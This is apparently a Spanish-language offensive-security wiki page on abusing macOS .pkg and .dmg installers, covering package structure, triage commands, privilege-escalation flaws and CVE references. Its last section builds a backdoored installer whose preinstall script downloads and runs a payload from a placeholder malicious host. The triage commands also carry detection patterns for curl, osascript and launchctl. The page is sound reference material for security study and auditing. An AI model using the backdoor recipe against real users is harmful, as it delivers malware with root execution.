# Abuso de Installers de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información Básica de Pkg

Un **paquete instalador** de macOS (también conocido como archivo `.pkg`) es un formato de archivo usado por macOS para **distribuir software**. Estos archivos son como una **caja que contiene todo lo que una pieza de software** necesita para instalarse y ejecutarse correctamente.

El propio archivo del paquete es un archivo comprimido que contiene una **jerarquía de archivos y directorios que se instalarán en el equipo objetivo**. También puede incluir **scripts** para realizar tareas antes y después de la instalación, como preparar archivos de configuración o limpiar versiones antiguas del software.

### Jerarquía

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizaciones (título, texto de bienvenida…) y comprobaciones de script/instalación
- **PackageInfo (xml)**: Información, requisitos de instalación, ubicación de instalación, rutas a scripts que ejecutar
- **Bill of materials (bom)**: Lista de archivos para instalar, actualizar o eliminar con permisos de archivos
- **Payload (CPIO archive gzip compressed)**: Archivos para instalar en el `install-location` desde PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts de pre y post instalación y más recursos extraídos a un directorio temporal para su ejecución.

### Descompresión
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar el contenido del instalador sin descomprimirlo manualmente, también puedes usar la herramienta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Si el objetivo es el análisis, intenta **evitar abrir el paquete con `Installer.app` primero**. Algunos paquetes pueden ejecutar código en cuanto Installer los abre (por ejemplo mediante `system.run()` o plug-ins del instalador), así que la extracción offline suele ser el punto de partida más seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Información básica de DMG

Los archivos DMG, o Apple Disk Images, son un formato de archivo usado por macOS de Apple para imágenes de disco. Un archivo DMG es esencialmente una **imagen de disco montable** (contiene su propio sistema de archivos) que contiene datos de bloques sin procesar, normalmente comprimidos y a veces cifrados. Cuando abres un archivo DMG, macOS lo **monta como si fuera un disco físico**, permitiéndote acceder a su contenido.

> [!CAUTION]
> Ten en cuenta que los instaladores **`.dmg`** soportan **tantos formatos** que en el pasado algunos de ellos que contenían vulnerabilidades fueron abusados para obtener **kernel code execution**.

### Jerarquía

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La jerarquía de un archivo DMG puede ser diferente según el contenido. Sin embargo, para DMGs de aplicaciones, normalmente sigue esta estructura:

- Nivel superior: Este es la raíz de la imagen de disco. A menudo contiene la aplicación y posiblemente un enlace a la carpeta Applications.
- Application (.app): Esta es la aplicación real. En macOS, una aplicación suele ser un paquete que contiene muchos archivos y carpetas individuales que forman la aplicación.
- Applications Link: Este es un acceso directo a la carpeta Applications en macOS. El propósito de esto es facilitarte la instalación de la aplicación. Puedes arrastrar el archivo .app a este acceso directo para instalar la app.

## Privesc via pkg abuse

### Execution from public directories

Si un script de pre o post installation, por ejemplo, se está ejecutando desde **`/var/tmp/Installerutil`**, y un atacante puede controlar ese script, podrá escalar privilegios cada vez que se ejecute. O un ejemplo similar:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta es una [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que varios instaladores y actualizadores llamarán para **ejecutar algo como root**. Esta función acepta la **ruta** del **archivo** a **ejecutar** como parámetro; sin embargo, si un atacante pudiera **modificar** este archivo, podrá **abusar** de su ejecución con root para **escalar privilegios**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para más info, consulta esta charla: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Abuso de environment y shebang

Los bugs modernos de PackageKit mostraron que los scripts de instalación a menudo se ejecutan como **trusted root code** mientras mantienen cerca el contexto controlado por el atacante. Al auditar paquetes de proveedores, presta especial atención a:

- Shell interpreters como `#!/bin/zsh` / `#!/bin/bash`
- Llamadas como `sudo -u $USER`, `launchctl asuser`, o cualquier lógica que confíe en `$USER`, `$HOME`, `PATH`, `TMPDIR`, o rutas relativas
- Non-shell interpreters que puedan cargar init files o libraries controlados por el usuario
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para el bug de entorno root de PackageKit de 2024 (`~/.zshenv` / herencia de `~/.bash*` durante instalaciones iniciadas por el usuario), consulta [la página genérica de privesc de macOS](../macos-privilege-escalation.md). Si el paquete está **firmado por Apple**, el mismo bug de script puede volverse **relevante para SIP/TCC** porque `system_installd` puede llevar `com.apple.rootless.install.heritable`; consulta [la página de SIP](../macos-security-protections/macos-sip.md).

### Ejecución mediante montaje

Si un instalador escribe en `/tmp/fixedname/bla/bla`, es posible **crear un montaje** sobre `/tmp/fixedname` con noowners para que puedas **modificar cualquier archivo durante la instalación** y abusar del proceso de instalación.

Un ejemplo de esto es **CVE-2021-26089**, que logró **sobrescribir un script periódico** para obtener ejecución como root. Para más información, mira la charla: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg como malware

### Carga útil vacía

Es posible generar simplemente un archivo **`.pkg`** con **scripts pre y post-instalación** sin ninguna carga útil real aparte del malware dentro de los scripts.

### JS en el XML de Distribution

Es posible añadir etiquetas **`<script>`** en el archivo XML de **distribution** del paquete y ese código se ejecutará, pudiendo **ejecutar comandos** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

En los paquetes de distribución esto normalmente depende de que el archivo `Distribution` de nivel superior habilite scripts externos, por ejemplo con `allow-external-scripts="true"`. Por tanto, revisar solo `preinstall` / `postinstall` no es suficiente: el propio XML de **Distribution** puede contener hooks `installation-check` / `volume-check` y rutas directas de ejecución `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Instalador con puerta trasera

Instalador malicioso que usa un script y código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referencias

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
